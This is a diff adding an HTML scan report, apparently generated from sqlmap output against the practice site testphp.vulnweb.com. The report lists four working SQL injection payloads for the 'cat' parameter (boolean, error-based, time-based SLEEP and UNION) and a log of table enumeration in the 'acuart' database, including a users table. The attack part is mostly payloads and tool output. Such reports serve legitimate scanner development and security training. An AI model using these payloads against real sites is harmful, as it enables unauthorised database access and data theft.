@@ -1,0 +1,34 @@
+
+    <html>
+    <head>
+        <title>Scan Report</title>
+        <style>
+            body { font-family: Arial, sans-serif; line-height: 1.6; }
+            h1, h2 { color: #333; }
+            .vuln { color: red; }
+            .data { color: green; }
+            .section { margin-bottom: 20px; }
+        </style>
+    </head>
+    <body>
+        <h1>Scan Report</h1>
+        <p><strong>Report Generated on:</strong> 2025-03-24 01:44:52</p>
+        <div class="section">
+            <h2>Target</h2>
+            <p>http://testphp.vulnweb.com/listproducts.php?cat=1</p>
+        </div>
+        <div class="section">
+            <h2 class="vuln">Vulnerabilities</h2>
+            <ul>
+                <li>Payload: cat=1 AND 1450=1450</li><li>Payload: cat=1 AND GTID_SUBSET(CONCAT(0x7162766a71,(SELECT (ELT(3770=3770,1))),0x716b766a71),3770)</li><li>Payload: cat=1 AND (SELECT 3351 FROM (SELECT(SLEEP(5)))MUwF)</li><li>Payload: cat=1 UNION ALL SELECT NULL,CONCAT(0x7162766a71,0x7664624e796c714c52727649767057655746544b464e6f4953444659484a4f5945494d4172437342,0x716b766a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -</li>
+            </ul>
+        </div>
+        <div class="section">
+            <h2 class="data">Data Dump</h2>
+            <ul>
+                <li>[01:42:26] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries</li><li>[01:42:26] [INFO] fetching entries for table 'artists' in database 'acuart'</li><li>Database: acuart</li><li>Table: artists</li><li>[3 entries]</li><li>[01:42:26] [INFO] fetching entries for table 'categ' in database 'acuart'</li><li>Database: acuart</li><li>Table: categ</li><li>[4 entries]</li><li>[01:42:26] [INFO] fetching entries for table 'carts' in database 'acuart'</li><li>Database: acuart</li><li>Table: carts</li><li>[01:42:26] [INFO] fetching entries for table 'featured' in database 'acuart'</li><li>[01:42:27] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique</li><li>[01:42:27] [INFO] fetching number of entries for table 'featured' in database 'acuart'</li><li>Database: acuart</li><li>Table: featured</li><li>[0 entries]</li><li>[01:42:27] [INFO] fetching entries for table 'products' in database 'acuart'</li><li>Database: acuart</li><li>Table: products</li><li>[3 entries]</li><li>[01:42:27] [INFO] fetching entries for table 'users' in database 'acuart'</li><li>Database: acuart</li><li>Table: users</li><li>[01:42:35] [INFO] fetching entries for table 'guestbook' in database 'acuart'</li><li>[01:42:36] [INFO] fetching number of entries for table 'guestbook' in database 'acuart'</li><li>Database: acuart</li><li>Table: guestbook</li><li>[0 entries]</li><li>[01:42:36] [INFO] fetching entries for table 'pictures' in database 'acuart'</li><li>Database: acuart</li><li>Table: pictures</li><li>[7 entries]</li>
+            </ul>
+        </div>
+    </body>
+    </html>
+    
